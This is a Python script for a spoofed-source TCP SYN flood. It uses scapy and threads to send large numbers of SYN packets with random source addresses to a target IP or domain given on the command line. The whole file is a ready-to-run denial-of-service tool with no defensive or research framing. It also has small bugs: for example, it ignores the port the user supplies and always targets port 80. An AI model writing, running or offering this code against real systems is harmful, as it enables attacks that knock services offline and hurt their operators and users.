import argparse
import random
import threading
from ipaddress import IPv4Address
from sys import stdout

from scapy.all import IP, TCP, send

from helpers import get_ip, get_rand_pack, print_tank


class DDOSHelper:

    @staticmethod
    def random_ip():
        bits = random.getrandbits(32)
        address = IPv4Address(bits)
        return str(address)

    def conf_ip(self, ip):
        IP_Packet = IP()
        IP_Packet.src = self.random_ip()
        IP_Packet.dst = ip
        return IP_Packet

    @staticmethod
    def configure_tcp_packet(port):
        TCP_Packet = TCP()
        TCP_Packet.dport = port
        TCP_Packet.flags = "S"
        TCP_Packet.seq = get_rand_pack()
        TCP_Packet.sport = get_rand_pack()
        TCP_Packet.window = get_rand_pack()

        return TCP_Packet

    @staticmethod
    def start_flood(IP_Packet, TCP_Packet, packets_count):
        sent = 0
        for i in range(packets_count):
            send(IP_Packet / TCP_Packet)
            stdout.write(f'send packet: {sent}')
            sent += 1
        stdout.write(f'All {packets_count} packets was send')

    def configure_params_and_start(self, ip, domain, port, threads, packets_count):
        print_tank()
        target_ip, target_port = get_ip(ip=ip, domain=domain, port=port)
        configure_ip = self.conf_ip(ip=target_ip)
        configure_tcp = self.configure_tcp_packet(port=80)
        for i in range(threads):
            thread = threading.Thread(target=self.start_flood, args=(configure_ip, configure_tcp, packets_count))
            thread.start()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='call --help for more info')
    parser.add_argument(
        '--ip',
        default=None,
        help='provide an ip target (default: None)'
    )
    parser.add_argument(
        '--domain',
        default=None,
        help='provide an domain target (default: None)'
    )
    parser.add_argument(
        '--threads',
        default=2,
        type=int,
        help='provide an threads num (default: 2)'
    )
    parser.add_argument(
        '--packets',
        default=100000,
        type=int,
        help='provide an domain target (default: None)'
    )
    parser.add_argument('port', type=int, help='Input port target', default=80)
    args = parser.parse_args()
    tank = DDOSHelper()
    tank.configure_params_and_start(
        ip=args.ip,
        domain=args.domain,
        port=args.port,
        threads=args.threads,
        packets_count=args.packets
    )

